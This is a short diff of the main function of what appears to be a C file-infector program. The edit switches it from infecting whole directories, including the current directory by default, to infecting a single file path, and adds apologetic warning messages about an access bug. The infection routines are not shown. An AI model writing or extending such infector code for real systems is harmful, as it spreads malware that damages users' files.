@@ -15,15 +15,22 @@ String** listDirectoryFile(String* dir);
 int main(int ac, char** args) {
   // I miss foreach :(
   String dir;
+  printf("[WARNING] There is a bug in the implementation, that blocks us from listing a directory.\n");
+  printf("[WARNING] (We get an access denied when we try to open the file later).\n");
+  printf("[WARNING] Hence, this implementation works only with file path, instead of directory.\n");
+  printf("[WARNING] Sorry.\n");
+  printf("[WARNING] Really.\n");
   for (int i = 1; i < ac; ++i) {
     dir.ptr = args[i];
     dir.length = strlen(args[i]);
-    infectDirectory(&dir);
+    infectFile(&dir);
+    //infectDirectory(&dir);
   }
   if (ac < 2) {
-    dir.ptr = _getcwd(NULL, 0);
-    dir.length = strlen(dir.ptr);
-    infectDirectory(&dir);
+    printf("Please provide a path to a file.\n");
+    //dir.ptr = _getcwd(NULL, 0);
+    //dir.length = strlen(dir.ptr);
+    //infectDirectory(&dir);
   }
   return 0;
 }
